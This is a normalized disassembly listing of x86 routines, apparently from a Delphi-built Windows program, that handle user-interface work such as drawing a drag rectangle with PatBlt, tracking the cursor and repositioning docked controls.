mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_4579c0
mov edx [ eax + 0x14 ]
mov eax esi
call sub_4561ec
mov eax [ ebx + 0x14 ]
call sub_403190
mov eax edi
call sub_403190
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_45742c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_4525b8
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407dac
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_455e60
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_452524
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_455e60
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_457848
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_4579c0
xor edx edx
mov eax edi
call sub_4561ec
sub_457508
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_455e38
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402960
mov edx eax
mov eax ebx
call sub_455e60
sub_457544
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4043d0
xor eax eax
push ebp
push sub_4575af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4041e0
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4575b6
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_4575bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45766b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_455bc8
mov eax [ ebp - 0x8 ]
call sub_457544
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_4575bc
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457672
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_4575bc
pop ecx
sub_457678
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4577b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_457760
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_452524
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457767
mov eax [ ebp - 0x10 ]
call sub_403190
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_457544
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_452538
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_457767
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_4575bc
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4577b8
lea eax [ ebp - 0x14 ]
call sub_403f20
retn
sub_4577c0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_455f10
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455f38
call sub_4577c0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455f10
call sub_4577c0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_455940
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_455e38
mov edx eax
mov eax ebx
call sub_455e60
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_455e60
jmp r-xdata
sub_457848
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_4577c0
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_45788c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_455e38
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_455e60
sub_4578bc
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_453a88
mov edx eax
mov eax [ rw-data ]
call sub_45841c
mov eax [ ebx + 0x14 ]
call sub_453a88
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_4579d0
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_45791c
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_45841c
mov eax ebx
call sub_4579d0
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_455e60
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_455e60
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_457848
push ebx
push sub_4579c0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4561ec
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_457998
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_452524
test eax eax
jle r-xdata
push ebx
push sub_4579c0
xor edx edx
mov eax ebx
call sub_4561ec
sub_4579d0
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_455a04
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_455a04
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_455a70
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_455a70
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_424240
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_457abc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_457abc
pop ecx
mov eax ebx
call sub_455e38
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_455e38
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_457abc
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_455e38
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42a91c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_457b4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_455e38
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4559bc
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_455e38
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_457abc
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457b9c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_44cb2c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44cb2c
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_457c18
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4558c8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_455974
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_455f1c
test eax eax
je r-xdata
mov eax esi
call sub_455940
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_4579c0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_4561ec
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_455f1c
mov edx [ ebx + 0x20 ]
call sub_455e74
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_457c18
pop ecx
sub_457c98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_455924
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_455924
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_455f1c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_457c98
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_4579c0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_4561ec
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_455b20
mov eax edi
call sub_455f10
test eax eax
je r-xdata
mov eax edi
call sub_455f1c
mov esi eax
mov eax esi
call sub_455e38
push eax
mov eax esi
call sub_455974
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_455f10
call sub_455e38
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_455e38
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_455e60
mov eax esi
call sub_455e38
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_455e60
mov eax edi
call sub_455f1c
call sub_455eb0
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_455974
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_455e60
mov eax edi
call sub_455f10
call sub_455eb0
mov bl 0x1
jmp r-xdata
sub_457dd0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_456184
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_416e0c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_456978
test eax eax
je r-xdata
push ebp
call sub_457c18
pop ecx
push ebp
call sub_457c98
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_457b9c
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_457e58
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_455a04
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_455a04
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_457b4c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_457b4c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_457ee8
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4582c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406b00
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_456978
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45791c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b00
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_456978
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44ccd0
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4582c7
lea eax [ ebp - 0x48 ]
call sub_403f20
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_453a88
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_44b9ec
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_44de8c
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f20
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_457dd0
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4525b8
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4579d0
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406b00
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_457e58
pop ecx
mov eax [ ebp - 0x4 ]
call sub_4579d0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b00
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_456978
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_44d0ac
jmp r-xdata
mov eax edi
call sub_469b24
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_456978
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44cb2c
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_44d18c
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f74
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4578bc
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b224
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_453a88
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_44d834
jmp r-xdata
sub_4582d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403160
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_458444
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_458360
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45841c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_4583c4
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
